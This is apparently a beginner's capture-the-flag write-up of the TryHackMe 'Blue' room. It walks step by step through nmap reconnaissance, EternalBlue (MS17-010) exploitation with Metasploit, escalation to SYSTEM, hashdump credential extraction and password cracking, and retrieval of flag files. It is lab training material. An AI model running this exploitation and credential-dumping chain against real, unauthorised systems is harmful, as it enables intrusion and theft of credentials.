# Blue — TryHackMe

**Author:** Rameez Ahmed • **Date:** 2025-11-11 • **Difficulty:** Beginner
**IP:** 10.10.9.100 • **Platform:** TryHackMe

---

## TL;DR

A Windows host exploited remotely: a discovered vulnerability was used to achieve remote code execution, gain an initial low-privilege shell as an attacker, and then escalate to SYSTEM. Flags are redacted for public posting.

---

## Environment & Tools

* <Target IP>
* Attacker: Kali Linux (tools used: `nmap`, `msfconsole`, `metasploit`, `Hashes.com`)
* Notes: This writeup is sanitized for public posting. Replace `REDACTED` with your personal notes if you keep a private copy.

---

## Recon

**Objective:** Discover open services, versions, and likely attack vectors.

1. TCP Port Scan
```bash
nmap -p- <target_ip>
```
This enumerates all TCP ports and reports running services; results will be used to prioritise potential attack vectors

**Objective:** Scan the first 1000 ports

2. TCP Port Scan for first 1000 Ports
```bash
nmap -p 1-999 <target_ip>
```
Ports 1–1000 commonly host services such as HTTP, SMB, and RDP; they are prioritised for follow-up enumeration


**Objective:** Identify the Vulnerabiltiy that the Target Machine has.

From the Hint provided the Vulnerbaility is understood to be related to SMBv1, and with some trial and error of the numerous MS exploits associated the one found to be a match was displayed by
3. Vulnerability Scan on Port 445
```bash
nmap -p 445 --script=smb-vuln-ms17-010 <target_ip>
```
Showing us that the Target is Vulnerable to Remote Code Executuion also known as Eternal Blue, under CVE-2017-0143 family. 

---

## Gain Access

**Objective:** Find and Configure the Exploit that the Target Machine is Vulnerable to

1. Start Metasploit
```bash
msfconsole
```
This is a Security Framework used to Identify and Launch Vulnerabilities

2. Search and Use the correct Exploit
```bash
search ms17-010
```
Here we find where exactly the Exploit Payload is located within Metasploit
```bash
use <Path-to-Payload>
```
This sets the Payload for us to Configure and Run

3. Configure the Payload
```bash
Show Options
```
This lists all Parameters, Required and Unrequired, to Configure before running
```bash
set RHOSTS <Target_IP>
```
Fill the Require Parameter 'RHOSTS' (Remote Host) with the IP of the Target so the Payload Exploits the Target

2. Run the Exploit
```bash
run
```
This will Execute the Payload using all the Parameters set and give Access to the Targets Machine

---

## Escalate

**Objective:** Escalate the Privilege of the Shell Obtained to Grant further Access

1. Background the Shell (Ctrl+Z) and Find Module that Converts a Shell into a Meterpreter Shell
```bash
search shell_to_meterpreter
```
Finding the Path to that Module in Metaspolit will allow us to Escalate the Privilege of the Current Shell Obtained 

2. Use and Configure the Converter with the Backgrounded Session
```bash
show options
```
Check the Required Parameters, in this case being the Session Number
```bash
set SESSION <Session-Num>
```
Set the Session to the Session Number of the Shell we Backgrounded in Gain Access

3. Run the Exploit
```bash
run
```
This should open up a Meterpreter Shell with Elevated Privileges. To check this, go to the Windows Shell using Command 'shell' then check Identity of shell with Command 'whoami'. If output 'NT AUTHORITY\SYSTEM' then Privileges have been Elevated

---

## Cracking

**Objective:** Extract the Valueable Data, in this case the Passwords, from the Target Machine

1. Migrate to a Process that is Running at the Elevated Privilege (NT AUTHORITY\SYSTEM)
```bash
ps
```
This should output the Processes Running, Choose a Process that is Running under the Elevated Privilege and Note the Process ID (PID)
```bash
migrate <PID>
```

2. Once Migrated, Run Hashdump to find the User it is Asking for as well as the associated Hash which is their Authentication Credentials
```bash
hashdump
```
With the Hashed Password of the User, go to any Decrypting Website and paste the Hash to Decrypt the Password

---

## Flags

**Objective:** Find Flags 1, 2, and 3 in the Targets Windows File System

1. Flag 1: By going to the Root Directory and Checking all the Files we can find flag1.txt here
```bash
cd ../../..
ls
cat flag1.txt
```
Simply Concatenate the .txt file and you will receive the first Flag

2. Flag 2: Given the Hint from the Question, we understand that the flag is where Windows stores the Passwords Locally. This Directory being 'C:\\Windows\System32\config'
```bash
cd Windows/System32/config
ls
cat flag2.txt
```
Concatenate the Second Flag

3. Flag 3: From the Hint, we understand that the final Flag is located in the Admins Files. The Admin in this Machine being Jon as figured out from the 'Cracking' Phase. To reach Jon's Documents, 'cd' back to the Root Directory then forward to Users Directory and into Jon's Directory. By checking his files, we can find the Flag in his Documents folder.
```bash
cd ../../../Users/Jon/Documents
ls
cat flag3.txt
```

---

## Conclusion

This room demonstrated a full exploitation chain against a vulnerable Windows machine, beginning with service enumeration and the identification of SMBv1 as an exposed attack surface. Leveraging the MS17-010 vulnerability allowed remote code execution and an initial foothold on the system. From there, privilege escalation was achieved through Metasploit tooling to obtain SYSTEM-level access, followed by credential extraction and flag discovery. Overall, this exercise reinforces the importance of regular patching, secure service configuration, and restricted privilege models within Windows environments.


